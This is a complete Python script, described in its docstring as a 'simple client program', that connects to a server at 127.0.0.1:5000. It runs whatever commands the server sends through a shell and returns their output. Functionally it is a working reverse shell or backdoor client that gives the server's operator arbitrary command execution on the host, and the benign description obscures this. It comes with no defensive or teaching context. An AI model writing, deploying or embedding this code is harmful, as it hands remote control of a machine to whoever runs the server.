import socket
import os
import subprocess

def client():
    """
    A simple client program that connects to a server, receives commands, executes them, 
    and sends back the results.

    The client:
    - Connects to the server using a specified host and port.
    - Listens for commands sent by the server.
    - Executes commands locally and sends the output back to the server.
    - Handles special commands like 'cd' to change directories.
    - Terminates the connection when the 'exit' command is received.
    """
    host = '127.0.0.1'
    port = 5000

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            print("Shutting down client...")
            break

        if command.startswith('cd '):
            try:
                os.chdir(command[3:])
                client_socket.send(b'Changed directory')
            except FileNotFoundError:
                client_socket.send(b'Directory not found')
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            client_socket.send(result if result else b'Command executed successfully')

    client_socket.close()

if __name__ == "__main__":
    client()
